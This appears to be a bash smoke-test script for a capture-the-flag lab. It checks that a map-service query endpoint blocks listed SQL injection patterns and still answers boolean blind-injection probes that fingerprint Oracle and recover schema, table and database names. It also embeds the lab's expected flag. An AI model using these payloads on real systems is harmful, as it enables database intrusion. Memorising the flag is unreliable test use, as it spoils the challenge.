#!/usr/bin/env bash
# FiberGrid CTF - smoke tests against a running lab.
#
# Spoiler note: this file (and the repository in general) contains the lab's
# expected values by design; see README.md.
set -uo pipefail

BASE="${LAB_URL:-http://localhost:8080}"
QUERY="$BASE/arcgis/rest/services/KAPSAMA_VEKTOR/MapServer/0/query"
EXPECTED_COUNT=118427   # seeded coverage rows (db/init/04_seed.sql)
PASS=0
FAIL=0

check() { # name expected actual
  local name="$1" expected="$2" actual="$3"
  if [[ "$actual" == *"$expected"* ]]; then
    printf '  PASS  %s\n' "$name"
    PASS=$((PASS + 1))
  else
    printf '  FAIL  %s\n' "$name"
    printf '        expected: %s\n' "$expected"
    printf '        got:      %.160s\n' "$actual"
    FAIL=$((FAIL + 1))
  fi
}

ask() { # where-clause
  curl -s -G "$QUERY" \
    --data-urlencode "where=$1" \
    --data-urlencode 'returnCountOnly=true' \
    --data-urlencode 'f=json'
}

echo "FiberGrid CTF smoke tests -> $BASE"

check "services directory lists KAPSAMA_VEKTOR" "KAPSAMA_VEKTOR" \
  "$(curl -s "$BASE/arcgis/rest/services?f=json")"
check "PrintingTools metadata is served" "\"tasks\"" \
  "$(curl -s "$BASE/arcgis/rest/services/Utilities/PrintingTools?f=json")"

check "boolean TRUE (1=1)" "\"count\":$EXPECTED_COUNT" "$(ask '1=1')"
check "boolean FALSE (1=2)" '"count":0' "$(ask '1=2')"

check "WAF blocks AND" "Request Rejected" "$(ask '1=1 AND 1=1')"
check "WAF blocks comments" "Request Rejected" "$(ask '1=1--')"
check "WAF blocks UNION" "Request Rejected" "$(ask '1=1 UNION SELECT 1')"
check "WAF blocks leading subquery" "Request Rejected" "$(ask '(SELECT 1 FROM TAB)')"
check "WAF blocks greater-than" "Request Rejected" "$(ask 'MAX(OBJECTID)>5')"
check "WAF blocks less-than" "Request Rejected" "$(ask 'MAX(OBJECTID)<5')"
check "WAF blocks ILIKE" "Request Rejected" "$(ask "ACIKLAMA ILIKE 'FLAG%'")"
check "WAF blocks EXISTS" "Request Rejected" "$(ask 'EXISTS(SELECT 1 FROM A90312)')"
check "WAF blocks BETWEEN" "Request Rejected" "$(ask "MAX(OBJECTID) BETWEEN 1 AND 2")"
check "WAF blocks LIMIT" "Request Rejected" "$(ask '1=1 LIMIT 1')"
check "WAF blocks LPAD prefix oracle" "Request Rejected" "$(ask "LPAD(ACIKLAMA,4)='FLAG'")"
check "WAF blocks OVERLAY" "Request Rejected" "$(ask "OVERLAY(ACIKLAMA PLACING 'FLAG' FROM 1 FOR 4)=ACIKLAMA")"
check "WAF blocks PG prefix operator" "Request Rejected" "$(ask "ACIKLAMA ^@ 'FLAG{'")"
check "WAF blocks double-encoded AND" "Request Rejected" "$(ask '1=1 %2541ND 1=1')"

check "Oracle fingerprint (SYS_GUID)" "\"count\":$EXPECTED_COUNT" "$(ask 'SYS_GUID() IS NOT NULL')"
check "session schema is CBS" "\"count\":$EXPECTED_COUNT" "$(ask "user='CBS'")"
check "DUAL is available" "\"count\":$EXPECTED_COUNT" \
  "$(ask "1=(SELECT DECODE(DUMMY,'X',1,-9) FROM DUAL)")"
check "staging table present (TAB)" "\"count\":$EXPECTED_COUNT" \
  "$(ask "1=(SELECT DECODE(MIN(TNAME),'A90312',1,-9) FROM TAB)")"
check "route table present (TAB)" "\"count\":$EXPECTED_COUNT" \
  "$(ask "1=(SELECT DECODE(MAX(TNAME),'GUZERGAH',1,-9) FROM TAB)")"
check "database name is LDS_GISDB" "\"count\":$EXPECTED_COUNT" \
  "$(ask "1=(SELECT DECODE(MAX(PROPERTY_VALUE),'LDS_GISDB',1,-9) FROM DATABASE_PROPERTIES WHERE PROPERTY_NAME='GLOBAL_DB_NAME')")"
check "route count boundary (MAX(OBJECTID)=742318)" '"count":0' \
  "$(ask '1=(SELECT DECODE(SIGN(MAX(OBJECTID)-742318),1,1,-1) FROM GUZERGAH)')"

check "recon flag in address data" "FLAG{r3c0n_publ1c_4ddr3ss_d4t4}" \
  "$(curl -s "$BASE/webservice/api/AddressData/Iller")"
check "export archive is served" "PK" \
  "$(curl -s "$BASE/webservice/api/Export?file=FTTH_ENVANTER_20260814_a91f3c.zip" | head -c 2)"

echo
echo "passed: $PASS  failed: $FAIL"
[[ $FAIL -eq 0 ]]
